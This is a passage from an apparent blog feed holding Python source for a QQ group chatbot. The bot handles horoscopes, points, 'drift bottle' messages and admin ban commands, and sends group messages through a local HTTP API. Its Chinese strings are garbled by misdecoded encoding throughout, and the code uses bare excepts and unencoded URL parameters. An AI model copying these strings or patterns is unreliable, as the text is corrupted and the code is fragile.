punctuation">&#125;</span></span><span class="token string">%\nè´¢è¿æŒ‡æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'money'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\nå·¥ä½œæŒ‡æ•°ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'work'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">%\nå¹¸è¿æ•°å­—ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\né€‚é…æ˜Ÿåº§ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'QFriend'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\næ€»ç»“ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ys<span class="token punctuation">[</span><span class="token string">'summary'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">minusPoint</span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">,</span>point<span class="token punctuation">)</span><span class="token punctuation">:</span>    groupUserInfo<span class="token operator">=</span>group<span class="token punctuation">.</span>readGroupUserInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>    thisGroupUserInfo<span class="token operator">=</span>groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        thisUser<span class="token operator">=</span>thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]è¯·å…ˆç­¾åˆ°åé‡è¯•"</span></span>    <span class="token keyword">if</span> thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token operator">-</span>point <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨çš„ç§¯åˆ†ä¸è¶³"</span></span>    thisUser<span class="token punctuation">[</span><span class="token string">'point'</span><span class="token punctuation">]</span><span class="token operator">-=</span>point    thisGroupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisUser    groupUserInfo<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>thisGroupUserInfo    group<span class="token punctuation">.</span>saveGroupUserInfo<span class="token punctuation">(</span>groupUserInfo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"OK"</span><span class="token keyword">def</span> <span class="token function">throwBottle</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        me<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>        send<span class="token operator">=</span>me<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        rec<span class="token operator">=</span>me<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        con<span class="token operator">=</span>me<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            bottle <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>        nb<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"QQ"</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"send"</span><span class="token punctuation">:</span>send<span class="token punctuation">,</span>            <span class="token string">"rec"</span><span class="token punctuation">:</span>rec<span class="token punctuation">,</span>            <span class="token string">"con"</span><span class="token punctuation">:</span>con        <span class="token punctuation">&#125;</span>        bottle<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nb<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>bottle<span class="token punctuation">,</span>f<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"biuï½ï½ï½ç“¶å­è¢«æ‰”èµ°å•¦ï¼Œåç­‰è¢«äººæ‰“æå§ï½ï½ï½"</span></span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æ‰”ç“¶å­å¤±è´¥äº†ï¼Œè¯·æ£€æŸ¥å†…å®¹æ ¼å¼æ˜¯å¦ä¸ºï¼š\næ‰”ç“¶å­ å‘é€è€…ï¼ˆå¯å¡«åŒ¿åï¼‰ æ¥å—è€…ï¼ˆå¯å¡«ç©ºï¼‰ å†…å®¹"</span><span class="token keyword">def</span> <span class="token function">getBottle</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        myBottles <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>          <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        bottle <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    num<span class="token operator">=</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>bottle<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    nb<span class="token operator">=</span>bottle<span class="token punctuation">[</span>num<span class="token punctuation">]</span>    bottle<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>nb<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>nb<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span>nb<span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'bottle.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>bottle<span class="token punctuation">,</span>f<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>myBottles<span class="token punctuation">,</span>f<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'send'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">æ‰”ç»™äº†</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'rec'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">myBottles</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        myBottles <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æ‚¨è¿˜æ²¡æœ‰ç“¶å­å‘¢ï¼Œå¿«å»æç“¶å­å§ï½ï½ï½"</span>    me<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        me<span class="token operator">+=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">[</span><span class="token string">'send'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">æ‰”ç»™äº†</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">[</span><span class="token string">'rec'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨çš„ç“¶å­æœ‰ï¼š\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>me<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">cleanBottles</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    num<span class="token operator">=</span>message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        myBottles <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨è¿˜æ²¡æœ‰ç“¶å­å‘¢ï¼Œå¿«å»æç“¶å­å§ï½ï½ï½"</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        nb<span class="token operator">=</span>myBottles<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'myBottles.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>myBottles<span class="token punctuation">,</span>f<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨æ‘”ç¢äº†</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'send'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">æ‰”ç»™</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'rec'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">ä¸€ä¸ªç“¶å­ï¼Œå†…å®¹æ˜¯ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span>nb<span class="token punctuation">[</span><span class="token string">'con'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]æ‚¨è¿˜æ²¡æœ‰è¿™ä¸ªç“¶å­ï¼Œå¿«å»æä¸€ä¸ªå§"</span></span><span class="token keyword">def</span> <span class="token function">keywordForGroup</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> uid<span class="token punctuation">,</span>nick<span class="token punctuation">,</span>role<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isBan<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> isAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'å¤©æ°”'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>weather<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'è¿åŠ¿'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>today<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"ç§¯åˆ†"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>point<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"å¬ä»–çš„è¯"</span> <span class="token keyword">and</span> uid<span class="token operator">==</span><span class="token number">405454586</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>giveAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>getQQ<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'ban'</span> <span class="token keyword">and</span> isAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>ban<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>getQQ<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'unban'</span> <span class="token keyword">and</span> isAdmin<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>unban<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>getQQ<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">'/help'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span><span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'åŒè‰²çƒ'</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>theDoubleChromosphere<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"ç­¾åˆ°"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>sign<span class="token punctuation">(</span>gid<span class="token punctuation">,</span>uid<span class="token punctuation">,</span>nick<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"æç“¶å­"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>getBottle<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"æˆ‘çš„ç“¶å­"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>myBottles<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"æ‘”ç“¶å­"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>cleanBottles<span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">elif</span> message<span class="token operator">==</span><span class="token string">"æ— å†…é¬¼"</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[CQ:at,qq=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>uid<span class="token punctuation">&#125;</span></span><span class="token string">]ç©¿ä»¶è¡£æœå§ä½ ï¼ä½ è‡ªå·±ä¸æ¶sinå—ï¼Ÿ"</span></span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r"[\(\)ï¼ˆï¼‰]"</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>        group<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>buquan<span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">,</span>gid<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">keywordForPerson</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"æ‰”ç“¶å­"</span><span class="token punctuation">:</span>        person<span class="token punctuation">.</span>sendMessage<span class="token punctuation">(</span>throwBottle<span class="token punctuation">(</span>uid<span class="token punctuation">,</span>message<span class="token punctuation">)</span><span class="token punctuation">,</span>uid<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#group.py</span><span class="token keyword">import</span> json<span class="token keyword">import</span> requests<span class="token comment">#ä¿å­˜ç”¨æˆ·ä¿¡æ¯</span><span class="token keyword">def</span> <span class="token function">saveGroupUserInfo</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'userInfoOfGroup.json'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>userInfo<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token comment">#è¯»å–ç”¨æˆ·ä¿¡æ¯</span><span class="token keyword">def</span> <span class="token function">readGroupUserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'userInfoOfGroup.json'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        userInfo <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>    <span class="token keyword">return</span> userInfo<span class="token comment">#å‘é€ä¿¡æ¯</span><span class="token keyword">def</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>gid<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:5700/send_msg?group_id="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;message="</span><span class="token operator">+</span>message    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFè®°å½•1</title>
      <link href="/posts/42117.html"/>
      <url>/posts/42117.html</url>
      
